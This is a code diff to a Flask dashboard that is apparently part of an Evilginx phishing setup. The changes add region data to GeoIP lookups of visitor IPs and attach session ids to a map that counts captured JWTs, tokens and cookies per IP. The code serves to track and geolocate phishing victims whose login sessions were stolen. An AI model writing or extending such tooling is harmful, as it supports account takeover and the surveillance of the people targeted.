@@ -43,7 +43,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.3"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.4"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -695,9 +695,9 @@ def _geo_lookup(ip):
     """Return (rec, wrote_cache). Never calls an external geo HTTP API."""
     cache = _geo_load_cache()
     hit = cache.get(ip)
-    if isinstance(hit, dict):
+    if isinstance(hit, dict) and "region" in hit:
         return hit, False
-    rec = {"lat": None, "lon": None, "city": "", "cc": ""}
+    rec = {"lat": None, "lon": None, "city": "", "region": "", "cc": ""}
     try:
         obj = ipaddress.ip_address(ip)
         if (
@@ -719,14 +719,19 @@ def _geo_lookup(ip):
     try:
         data = reader.get(ip) or {}
         loc = data.get("location") or {}
+        subs = data.get("subdivisions") or []
+        region = ", ".join(
+            n for n in (_geo_en_name(s) for s in subs) if n
+        )
         rec = {
             "lat": loc.get("latitude"),
             "lon": loc.get("longitude"),
             "city": _geo_en_name(data.get("city")),
+            "region": region,
             "cc": (data.get("country") or {}).get("iso_code") or "",
         }
     except Exception:
-        rec = {"lat": None, "lon": None, "city": "", "cc": ""}
+        rec = {"lat": None, "lon": None, "city": "", "region": "", "cc": ""}
     cache[ip] = rec
     return rec, True
 
@@ -879,14 +884,20 @@ def api_dashboard_map():
                     "lat": lat,
                     "lon": lon,
                     "city": geo.get("city") or "",
+                    "region": geo.get("region") or "",
                     "cc": geo.get("cc") or "",
                     "jwt": 0,
                     "tokens": 0,
                     "empty": 0,
                     "n": 0,
+                    "ids": [],
                 }
                 buckets[ip] = b
             b["n"] += 1
+            try:
+                b["ids"].append(int(s.get("id")))
+            except (TypeError, ValueError):
+                pass
             if s.get("has_jwt"):
                 b["jwt"] += 1
             if (s.get("n_cookies") or 0) > 0:
